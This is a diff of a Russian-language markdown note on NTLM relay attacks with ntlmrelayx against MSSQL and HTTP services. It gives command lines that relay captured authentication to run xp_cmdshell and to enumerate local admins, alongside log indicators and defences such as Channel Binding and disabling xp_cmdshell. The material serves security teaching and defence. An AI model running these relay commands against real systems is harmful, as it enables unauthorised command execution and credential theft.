@@ -1,30 +1,60 @@
-# MSSQL Relay / HTTP Relay через ntlmrelayx
+# MSSQL Relay / HTTP Relay (ntlmrelayx)
 
 ## 🎯 Цель атаки
-Использовать перехваченную NTLM-аутентификацию для выполнения действий на серверах MSSQL или HTTP-приложениях.
+Использовать перехваченную NTLM‑аутентификацию для выполнения действий на **MSSQL** или **HTTP** сервисах.
 
-## 📋 Условия
-- Доступ к целевым MSSQL/HTTP сервисам.
-- Отключена проверка подписи NTLM (SMB/HTTP) или нет Channel Binding.
+## 📋 Описание
+ntlmrelayx поддерживает целевые протоколы SMB/LDAP/HTTP/MSSQL.  
+При уязвимой конфигурации (нет Channel Binding / Extended Protection / подписи) возможно выполнение команд на MSSQL (`xp_cmdshell`) или злоупотребление контекстом на HTTP.
 
-## 🔹 Пошагово (MSSQL Relay)
-1. Запустить ntlmrelayx с целью MSSQL:
+## ⚠ Условия эксплуатации
+- На цели отключены/не настроены защитные механизмы (Signing/EP/CB).
+- Перехват NTLM возможен (LLMNR/WPAD/MITM6/PrinterBug и т.п.).
+
+## 🔹 Пошагово в лаборатории
+> ⚠ Только в изолированной среде!
+
+### MSSQL Relay
+1. Запускаем релей на MSSQL с выполнением команды:
 ```bash
-ntlmrelayx.py -t mssql://192.168.0.55 --execute "xp_cmdshell 'whoami'"
+ntlmrelayx.py -t mssql://10.0.0.55 --execute "xp_cmdshell 'whoami'"
 ```
-2. При аутентификации жертвы — команда выполняется на MSSQL-сервере.
+2. При аутентификации жертвы команда выполнится в контексте её прав на MSSQL.
 
-## 🔹 Пошагово (HTTP Relay)
-1. Запустить ntlmrelayx с целью HTTP:
+### HTTP Relay
+1. Релей на HTTP‑приложение (пример — перечисление локальных админов/ресурсов):
 ```bash
-ntlmrelayx.py -t http://intranet.domain.local --enum-local-admins
+ntlmrelayx.py -t http://intranet.lab.local --enum-local-admins
 ```
+2. Используем дополнительные действия (`--dump-laps`, `--adcs` и т.д.) когда поддерживается.
 
-## 📊 SIEM
-- Логи MSSQL о выполнении xp_cmdshell.
-- HTTP-логи с NTLM-аутентификацией от неожиданных клиентов.
+## 📊 Признаки в логах и мониторинг
+- MSSQL: события выполнения `xp_cmdshell`, лог‑инстанс агента.
+- HTTP: логи аутентификации NTLM с неожиданных клиентов.
+- 4624 Type 3 на целях релея.
 
-## 🛡 Защита
-- Включить Channel Binding для HTTP.
-- Запретить NTLM для MSSQL и HTTP.
-- Ограничить доступ к MSSQL по сети.
+## 🛡 Меры защиты
+- Включить **Extended Protection**/**Channel Binding** на HTTP/IIS.
+- Отключить `xp_cmdshell` на MSSQL и применять подпись NTLM где возможно.
+- Запрет NTLM/принудительный Kerberos.
+
+## 🔗 Источники
+- ntlmrelayx documentation / MSSQL & HTTP relay research
+
+---
+
+## 🔍 Разбор команд
+
+### 1. Релей на MSSQL и выполнение команды
+```bash
+ntlmrelayx.py -t mssql://10.0.0.55 --execute "xp_cmdshell 'whoami'"
+```
+- **`-t mssql://...`** — цель MSSQL.
+- **`--execute "xp_cmdshell '...'"`** — выполнить системную команду через расширенную хранимую процедуру.
+
+### 2. Релей на HTTP
+```bash
+ntlmrelayx.py -t http://intranet.lab.local --enum-local-admins
+```
+- **`-t http://...`** — цель HTTP.
+- **`--enum-local-admins`** — одна из встроенных операций для целевого хоста/приложения.
